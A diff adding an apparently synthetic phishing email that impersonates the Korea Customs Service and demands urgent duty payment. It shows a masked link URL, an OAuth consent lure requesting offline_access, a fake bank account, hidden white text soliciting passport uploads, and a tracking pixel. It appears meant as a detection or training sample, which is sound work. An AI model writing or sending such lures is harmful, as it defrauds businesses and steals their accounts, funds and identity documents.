@@ -1,0 +1,103 @@
+From: 관세청 KOREA CUSTOMS SERVICE <import.duty@kcs-gov-tax.example>
+To: trade@corp.internal
+Cc: finance@corp.internal
+Date: Sun, 25 Oct 2026 16:00:00 +0900
+Message-ID: <0701-b59@synth.example>
+Subject: [세관고지서] 수입신고 번호 2026-8842-4471 — 관세·부가세 체납 (납부기한 임박)
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif">
+<p>무역부, 재무부 귀하</p>
+
+<p>귀사의 수입신고(신고번호: <b>2026-8842-4471</b>)에 대한 관세·부가세 고지서가 발부되었습니다. <b>납부기한이 <b style="color:#e00">명일(10/26)까지</b></b>이므로 즉시 납부하시기 바랍니다.</p>
+
+<h3>一、고지 내역</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:180px">수입신고번호</td><td><b>2026-8842-4471</b></td></tr>
+<tr><td style="background:#f5f5f5">신고일자</td><td>2026-10-10</td></tr>
+<tr><td style="background:#f5f5f5">품명</td><td>전자부품 (HS Code: 8544.42-9000)</td></tr>
+<tr><td style="background:#f5f5f5">수량</td><td>12,000 PCS</td></tr>
+<tr><td style="background:#f5f5f5">거래금애 (CIF)</td><td>USD $184,200.00</td></tr>
+<tr><td style="background:#f5f5f5">관세 (8%)</td><td>₩19,742,000</td></tr>
+<tr><td style="background:#f5f5f5">부가세 (10%)</td><td>₩26,482,000</td></tr>
+<tr><td style="background:#f5f5f5">개별소비세</td><td>₩0</td></tr>
+<tr><td style="background:#f5f5f5">교통·에너지세</td><td>₩0</td></tr>
+<tr><td style="background:#f5f5f5"><b>합계 납부액</b></td><td><b style="color:#e00">₩46,224,000</b></td></tr>
+<tr><td style="background:#f5f5f5">납부기한</td><td style="color:#e00"><b>2026-10-26 (명일)</b></td></tr>
+<tr><td style="background:#f5f5f5">체납 시 가산세</td><td>매일 0.022% (연 8%)</td></tr>
+</table>
+
+<h3>二、납부 방법</h3>
+
+<p><b>방법 1 (권장) — 온라인 납부 (Naver 인증):</b></p>
+
+<p>관세청의 온라인 납부 시스템은 2026년 Q3부터 <b>Naver 인증</b>을 지원합니다:</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://kcs-gov-tax.example/payment/duty/2026-8842-4471" style="display:inline-block;background:#03C75A;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold;font-size:16px">관세 납부하기 — ₩46,224,000</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://unipass.customs.go.kr/payment/import-duty</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（Naver 계정 또는 사업자 인증서로 로그인）</p>
+
+<h3>Naver 인증 안내</h3>
+<p>납부 버튼을 클릭하면 <b>nid.naver.com</b> (네이버 공식 인증 페이지)로 이동합니다:</p>
+<ol>
+<li>사업자 Naver 계정으로 로그인</li>
+<li>권한 승인 (openid, profile, offline_access)</li>
+<li>납부 페이지로 자동 이동</li>
+<li>계좌 정보 입력 후 납부 완료</li>
+</ol>
+
+<p style="font-size:14px;background:#E8F5E9;padding:12px;border-radius:4px">
+<b>offline_access에 대하여:</b> 관세 납부 절차에는 세금 계산서 확인, 계좌 정보 입력, 이체 승인 등 여러 단계가 포함되어 총 10-15분이 소요됩니다. offline_access 권한은 납부 절차 동안 로그인 상태를 유지하기 위해 필요합니다. 이 토큰은 관세청 납부 시스템에만 사용되며 24시간 후 자동 만료됩니다.
+</p>
+
+<p><b>방법 2 — 은행 계좌이체:</b></p>
+<div style="background:#f9f9f9;padding:12px;border-radius:4px;border-left:4px solid #03C75A">
+<p>예금주: 관세청 수입세 납부계좌 (인천세관)<br>
+은행: KB국민은행 인천공항출장소<br>
+계좌번호: 8842-01-4471-992<br>
+금액: ₩46,224,000<br>
+입금자명: 귀사 상호 + 수입신고번호</p>
+</div>
+<p style="font-size:13px;color:#666">계좌이체는 1-2 영업일 소요되어 납부기한을 초과할 수 있습니다.</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">중국어 서비스가 필요하시면 kcs-gov-tax.example/cn-service 에서 사업자등록증과 법인 여권을 직접 업로드하세요 (중국 통관 대행 서비스, 3영업일).</p>
+
+<h3>三、체납 시 불이익</h3>
+<ul>
+<li><b>가산세:</b> 체납일수 × 0.022% (₩46,224,000 기준 약 ₩10,169/일)</li>
+<li><b>수입통제:</b> 체납 기간 중 신규 수입신고 제한</li>
+<li><b>보세구역 반출 금지:</b> 현재 보관 중인 물품 출고 불가</li>
+<li><b>강제 징수:</b> 30일 이상 체납 시 국세징수법에 따라 강제 징수</li>
+<li><b>신용불량:</b> 90일 이상 체납 시 국세 체납자 명부 등재</li>
+</ul>
+
+<h3>四、수입 물품 현황</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>컨테이너</th><th>품명</th><th>수량</th><th>보관장소</th><th>상태</th></tr>
+<tr><td>TCNU8842101</td><td>커넥터 A타입</td><td>5,000</td><td>인천공항 보세창고</td><td style="color:#e00">출고 보류</td></tr>
+<tr><td>TCNU8842102</td><td>커넥터 B타입</td><td>4,000</td><td>인천공항 보세창고</td><td style="color:#e00">출고 보류</td></tr>
+<tr><td>TCNU8842103</td><td>소켓 QFN48</td><td>3,000</td><td>인천항 제1보세구역</td><td style="color:#e00">출고 보류</td></tr>
+</table>
+<p style="font-size:13px;color:#666">관세 납부 완료 시 즉시 출고 승인됩니다.</p>
+
+<h3>五、연락처</h3>
+<p>인천세관 수입과: +82-32-889-****<br>
+중국어 지원: +82-32-889-**** (내선 3)<br>
+이메일: import.duty@kcs-gov-tax.example</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">관세청 (KOREA CUSTOMS SERVICE) | 인천세관</p>
+<p style="font-size:11px;color:#999">인천광역시 중구 공항동로 207 인천공항세관</p>
+<p style="font-size:11px;color:#999">본 이메일은 자동 발송되었습니다.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://kcs-gov-tax.example/api/track?recipient=trade%40corp.internal&case=2026-8842-4471&type=duty_notice" width="1" height="1" alt="">
+</div>
+
+</body></html>
